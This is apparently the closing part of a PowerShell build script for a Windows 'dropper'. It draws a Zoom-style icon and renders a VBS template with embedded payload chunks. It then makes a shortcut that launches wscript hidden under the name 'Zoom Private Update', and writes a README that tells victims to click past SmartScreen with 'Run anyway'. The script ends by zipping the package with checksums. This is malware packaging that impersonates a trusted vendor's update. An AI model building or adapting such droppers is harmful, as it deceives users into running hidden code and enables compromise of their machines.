        (New-Object System.Drawing.PointF(($size * 0.64), ($size * 0.44))),
        (New-Object System.Drawing.PointF(($size * 0.83), ($size * 0.35))),
        (New-Object System.Drawing.PointF(($size * 0.83), ($size * 0.65))),
        (New-Object System.Drawing.PointF(($size * 0.64), ($size * 0.56)))
    )
    $g.FillPolygon($white, $lens)

    $path.Dispose(); $body.Dispose(); $brush.Dispose(); $g.Dispose()
    return $bmp
}

$sizes = @(16, 24, 32, 48, 64, 128, 256)
$blobs = @()
foreach ($s in $sizes)
{
    $bmp = New-ZoomBitmap $s
    $ms = New-Object System.IO.MemoryStream
    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
    $blobs += ,$ms.ToArray()
    $bmp.Dispose(); $ms.Dispose()
}

$icoMs = New-Object System.IO.MemoryStream
$writer = New-Object System.IO.BinaryWriter($icoMs)
$writer.Write([UInt16]0)
$writer.Write([UInt16]1)
$writer.Write([UInt16]$sizes.Count)
$offset = 6 + 16 * $sizes.Count
for ($i = 0; $i -lt $sizes.Count; $i++)
{
    $dim = if ($sizes[$i] -ge 256) { 0 } else { $sizes[$i] }
    $writer.Write([Byte]$dim)
    $writer.Write([Byte]$dim)
    $writer.Write([Byte]0)
    $writer.Write([Byte]0)
    $writer.Write([UInt16]1)
    $writer.Write([UInt16]32)
    $writer.Write([UInt32]$blobs[$i].Length)
    $writer.Write([UInt32]$offset)
    $offset += $blobs[$i].Length
}
foreach ($blob in $blobs) { $writer.Write($blob) }
$writer.Flush()
[IO.File]::WriteAllBytes($ico, $icoMs.ToArray())
$writer.Dispose(); $icoMs.Dispose()

# ------------------------------------------------------------------------------
# Render template
# ------------------------------------------------------------------------------
$templatePath = Join-Path $here 'windows-dropper.template.vbs'
$template = Get-Content -Raw -LiteralPath $templatePath
$render = $template.Replace('__CHUNKS__', $arrayText).Replace('__ICON__', "$base.ico")
$render = $render -replace "`r?`n", "`r`n"
[IO.File]::WriteAllText($vbs, $render, (New-Object Text.ASCIIEncoding))

# ------------------------------------------------------------------------------
# Portable shortcut: relative script argument, blank working directory
# ------------------------------------------------------------------------------
$shell = New-Object -ComObject WScript.Shell
$link = $shell.CreateShortcut($lnk)
$link.TargetPath = "$env:WINDIR\System32\wscript.exe"
$link.Arguments = "//nologo //B `"$base.vbs`""
$link.WorkingDirectory = ''
$link.IconLocation = "$base.ico,0"
$link.Description = 'Zoom Private Update'
$link.Save()
[Runtime.InteropServices.Marshal]::ReleaseComObject($link) | Out-Null
[Runtime.InteropServices.Marshal]::ReleaseComObject($shell) | Out-Null

# ------------------------------------------------------------------------------
# Copy into the source folder and write checksums
# ------------------------------------------------------------------------------
Copy-Item $vbs (Join-Path $here 'zoom-update-microsoft.vbs') -Force
Copy-Item $ico (Join-Path $here "$base.ico") -Force

$readme = @"
Zoom Private Update - Windows

Double-click "$base.lnk" (Zoom icon). No console, no chmod.
The shortcut starts "$base.vbs" hidden from this same folder.

If Windows shows a SmartScreen/Mark-of-the-Web prompt, choose
"More info" -> "Run anyway".

Hashes: see SHA256SUMS-windows-dropper.
"@
$readmePath = Join-Path $dist "$base.README.txt"
[IO.File]::WriteAllText($readmePath, $readme, (New-Object Text.UTF8Encoding($false)))

$zipPath = Join-Path $dist "$base.zip"
Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue
Compress-Archive -LiteralPath @($lnk, $vbs, $ico, $readmePath) -DestinationPath $zipPath -Force

$sums = foreach ($file in @($vbs, $ico, $lnk, $zipPath))
{
    $hash = (Get-FileHash -LiteralPath $file -Algorithm SHA256).Hash.ToLowerInvariant()
    "$hash  $(Split-Path -Leaf $file)"
}
$sums | Set-Content -LiteralPath (Join-Path $dist 'SHA256SUMS-windows-dropper') -Encoding ASCII

Write-Host "Built $vbs"
Write-Host "Built $ico"
Write-Host "Built $lnk"
